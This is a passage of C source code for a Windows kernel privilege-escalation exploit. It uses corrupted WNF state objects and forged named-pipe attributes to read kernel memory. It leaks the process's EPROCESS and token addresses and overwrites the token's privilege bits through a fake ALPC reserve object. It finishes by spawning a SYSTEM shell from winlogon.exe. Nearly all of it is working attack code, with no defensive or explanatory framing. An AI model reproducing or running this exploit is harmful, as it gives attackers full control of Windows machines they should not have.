    for (int i = 1; i < SPRAY_TWO_MAL; i = i + 2) {
        memset(WNFOutput_Pipe, 0x0, sizeof(WNFOutput_Pipe));
        WNFOutputSize = 0x1000;
        state = pNtQueryWnfStateData(&spray2_mal[i], NULL, NULL, &stamp_pipe, WNFOutput_Pipe, &WNFOutputSize_Pipe);
        if (stamp_pipe == 0xbeef) {
            printf("[+] Found corrupted WNF object; index: %d, stamp: 0x%lx, state: 0x%lx\n", i, stamp_pipe, state);
            CorruptedWNFidx_Pipe = i;
            Pipe_leak = *((unsigned long long*)(WNFOutput_Pipe + 0xff0));
            printf("[+] PipeAttribute.Flink leaked address: 0x%llx\n", Pipe_leak);
            break;
        }
    }
    if (CorruptedWNFidx_Pipe == -1 || Pipe_leak == 0) {
        printf("[!] Unable to find corrupted object\n");
        Sleep(5000);
        return 1;
    }

    // Step 7: Arbitrary Read

    printf("[+] Setting up fake PipeAttribute objects in userland\n");
    char FakePipe[0x1000];
    char FakePipe2[0x1000];
    char FakePipeName[] = "fakepipe\00";
    char FakePipeName2[] = "fakepipe2\00";
    memset(FakePipe, 0x0, sizeof(FakePipe));
    memset(FakePipe2, 0x0, sizeof(FakePipe2));
    
    *(uint64_t*)(FakePipe + 0) = (uint64_t)FakePipe2;           // PipeAttribute.list.Flink
    *(uint64_t*)(FakePipe + 8) = Pipe_leak;                     // PipeAttribute.list.Blink
    *(uint64_t*)(FakePipe + 0x10) = (uint64_t)FakePipeName;     // PipeAttribute.AttributeName
    *(uint64_t*)(FakePipe + 0x18) = 0x30;                       // PipeAttribute.AttributeValueSize
    *(uint64_t*)(FakePipe + 0x20) = ALPC_leak;                  // PipeAttribute.AttributeValue
    *(uint64_t*)(FakePipe + 0x28) = 0x4545454545454545;         // PipeAttribute.Data

    *(uint64_t*)(FakePipe2 + 0) = 0x5050505050505050;           // PipeAttribute.list.Flink
    *(uint64_t*)(FakePipe2 + 8) = (uint64_t)FakePipe;           // PipeAttribute.list.Blink
    *(uint64_t*)(FakePipe2 + 0x10) = (uint64_t)FakePipeName2;   // PipeAttribute.AttributeName
    *(uint64_t*)(FakePipe2 + 0x18) = 0x30;                      // PipeAttribute.AttributeValueSize
    *(uint64_t*)(FakePipe2 + 0x20) = ALPC_leak;                 // PipeAttribute.AttributeValue
    *(uint64_t*)(FakePipe2 + 0x28) = 0x4545454545454545;        // PipeAttribute.Data

    printf("[+] Address of Fake PipeAttribte 1: 0x%llx\n", (uint64_t)FakePipe);
    printf("[+] Address of Fake PipeAttribte 2: 0x%llx\n", (uint64_t)FakePipe2);

    printf("[+] Corrupting PipeAttribute using 2nd corrupted WNF Object\n");
    memset(buffer_2, 'E', sizeof(buffer_2));
    *(uint64_t*)(buffer_2 + 0xff0) = (uint64_t)FakePipe;
    state = pNtUpdateWnfStateData(&(spray2_mal[CorruptedWNFidx_Pipe]), buffer_2, 0xff8, NULL, NULL, 0xbeef, NULL);
    
    
    printf("[+] Arbitrary Read from corrupted PipeAttribute object\n");
    int CorruptedPipeIdx = -1;
    uint64_t ALPC_port_leak = 0;
    for (int i = 0; i < PIPE_COUNT; i++) {
        memset(PipeData, 0x0, sizeof(PipeData));
        ret = pNtFsControlFile(pWrite[i], NULL, NULL, NULL, &pipe_status, 0x110038, FakePipeName, (strlen(FakePipeName) + 1), PipeData, 0x1000);
        if (ret == 0) {
            printf("[+] Retrieved KALPC_RESERVE via Arbitrary Read..\n");
            ALPC_port_leak = *((uint64_t*)(PipeData + 0x0)); // KALPC_RESERVE.ALPC_PORT
            CorruptedPipeIdx = i;
            printf("[+] KALPC_RESERVE.ALPC_PORT leak: 0x%llx\n", ALPC_port_leak);
            break;
        }
    }
    if (CorruptedPipeIdx == -1 || ALPC_port_leak == 0) {
        printf("[!] ALPC_port leak failed\n");
        return -1;
    }

    // Step 8: Leak Current process's EPROCESS via ALPC_PORT.OwnerProcess

    uint64_t cur_EPROCESS = 0;
    *(uint64_t*)(FakePipe + 0x18) = 0x30;                       // PipeAttribute.AttributeValueSize
    *(uint64_t*)(FakePipe + 0x20) = ALPC_port_leak;             // PipeAttribute.AttributeValue
    printf("[+] Attempting to read ALPC_PORT.OwnerProcess\n");
    pNtFsControlFile(pWrite[CorruptedPipeIdx], NULL, NULL, NULL, &pipe_status, 0x110038, FakePipeName, (strlen(FakePipeName) + 1), PipeData, 0x1000);
    cur_EPROCESS = *(uint64_t*)(PipeData + 0x18); // ALPC_PORT.OwnerProcess
    if (cur_EPROCESS == 0) {
        printf("[-] Unable to leak current EPROCESS address\n");
    }
    printf("[+] Current EPROCESS address: 0x%llx\n", cur_EPROCESS);

    uint64_t cur_Token = 0;
    *(uint64_t*)(FakePipe + 0x18) = 0x500;                      // PipeAttribute.AttributeValueSize
    *(uint64_t*)(FakePipe + 0x20) = cur_EPROCESS;               // PipeAttribute.AttributeValue
    pNtFsControlFile(pWrite[CorruptedPipeIdx], NULL, NULL, NULL, &pipe_status, 0x110038, FakePipeName, (strlen(FakePipeName) + 1), PipeData, 0x1000);
    cur_Token = *(uint64_t*)(PipeData + 0x4b8) & 0xFFFFFFFFFFFFFFF0; // EPROCESS.Token
    if (cur_Token == 0) {
        printf("[-] Unable to leak current Token of the process\n");
    }
    printf("[+] Current EPROCESS.Token: 0x%llx\n", cur_Token);

    // Step 9: Creating a fake ALPC_RESERVE

    printf("[+] Preparing Fake KALPC_RESERVE and KALPC_MESSAGE\n");
    
    BYTE* FakeKALPCReserveObject = (BYTE*)calloc(1, sizeof(KALPC_RESERVE) + 0x20);
    BYTE* FakeKALPCMessageObject = (BYTE*)calloc(1, sizeof(KALPC_MESSAGE) + 0x20);
    KALPC_RESERVE* FakeKALPCReserve = (KALPC_RESERVE*)(FakeKALPCReserveObject + 0x20);
    KALPC_MESSAGE* FakeKALPCMessage = (KALPC_MESSAGE*)(FakeKALPCMessageObject + 0x20);

    memset(FakeKALPCReserveObject, 0, sizeof(KALPC_RESERVE) + 0x20);
    memset(FakeKALPCMessageObject, 0, sizeof(KALPC_MESSAGE) + 0x20);
    FakeKALPCReserveObject[1] = 0x7;
    FakeKALPCReserveObject[8] = 0x1;

    FakeKALPCReserve->Size = 0x28;
    FakeKALPCReserve->Message = FakeKALPCMessage;

    FakeKALPCMessage->Reserve = FakeKALPCReserve;
    FakeKALPCMessage->ExtensionBuffer = (BYTE*)cur_Token + 0x40; // EPROCESS.Token.Privileges
    FakeKALPCMessage->ExtensionBufferSize = 0x10;

    // Use corrupted WNF object 1 to overwrite KALPC_RESERVE in handle table
    printf("[+] Corrupting KALPC_RESERVE using 1st corrupted WNF Object\n");
    memset(buffer, 'E', sizeof(buffer));
    *(uint64_t*)(buffer + 0xff0) = (uint64_t)FakeKALPCReserve;
    state = pNtUpdateWnfStateData(&spray1_mal[CorruptedWNFidx], buffer, 0xff8, NULL, NULL, 0xcafe, NULL);

    printf("[+] Overwritting EPROCESS.Token Privileges\n");
    ULONG DataLength = 0x10;
    ALPC_MESSAGE* alpcMessage = (ALPC_MESSAGE*)calloc(1, sizeof(ALPC_MESSAGE));
    memset(alpcMessage, 0, sizeof(ALPC_MESSAGE));
    alpcMessage->PortHeader.u1.s1.DataLength = DataLength;
    alpcMessage->PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + DataLength;
    alpcMessage->PortHeader.MessageId = (ULONG)g_hResource;
    ULONG_PTR* pAlpcMsgData = (ULONG_PTR*)((BYTE*)alpcMessage + sizeof(PORT_MESSAGE));
    pAlpcMsgData[0] = 0xffffffffffffffff; // EPROCESS.Token.Privileges.Present
    pAlpcMsgData[1] = 0xffffffffffffffff; // EPROCESS.Token.Privileges.Enabled

    for (int i = 0; i < portsCount; i++) {
        ret = pNtAlpcSendWaitReceivePort(pcPorts[i], ALPC_MSGFLG_NONE, (PPORT_MESSAGE)alpcMessage, NULL, NULL, NULL, NULL, NULL);
    }

    Sleep(1000);


    // Find PID of winlogon
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE winlogon_process = 0;

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) {
                winlogon_process = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, entry.th32ProcessID);
                printf("[+] Found Winlogon: 0x%lx\n", winlogon_process);
            }
        }
    }

    printf("[+] Spawning shell as SYSTEM...\n");
    CreateProcessFromHandle(winlogon_process);

    getchar();

    return 0;
}